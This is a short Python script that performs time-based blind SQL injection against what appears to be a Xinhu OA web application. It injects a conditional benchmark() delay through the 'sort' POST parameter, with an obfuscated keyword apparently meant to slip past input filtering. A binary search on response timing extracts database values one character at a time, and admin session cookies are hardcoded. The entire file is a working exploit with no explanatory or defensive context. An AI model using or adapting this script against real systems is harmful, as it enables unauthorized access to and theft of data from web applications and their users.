import requests
import time

url = 'http://localhost/index.php?a=publicstore&m=goods&d=main&ajaxbool=true&rnd=698743'
cookies = {
    'deviceid': '1667583010543',
    'xinhu_ca_adminuser': 'admin',
    'xinhu_ca_rempass': '0',
    'PHPSESSID': 'vpafpcnldov517qfk5d6dvjsv0',
    'xinhu_mo_adminid': 'dee0ll0deg0ddi0ii0ll0dee0dne0ded0jl0ie0dez0wi0wd0wg0al08'
}

rst = ''

for i in range(1, 20):
    head = 32
    tail = 127
    mid = (head + tail) // 2
    while head < tail:
        data = {
            'dir': 'desc',
            'limit': '15',
            'page': '1',
            'sort': f'(if(ascii(substr(usselecter(/insert**insert/),{i},1))>{mid},benchmark(1000000000,1),b.uname))',
            'start': '0',
            'storeafteraction': 'croptaftershow',
            'storebeforeaction': 'croptbeforeshow',
            'tablename_abc': 'lr0zr0zj0eew0lr0je0gw0zw07'
        }
        start_time = time.time()
        r = requests.post(url=url, data=data, cookies=cookies)
        if time.time() - start_time > 2:
            head = mid + 1
        else:
            tail = mid
        mid = (head + tail) // 2
    rst += chr(mid)
    print(rst)     
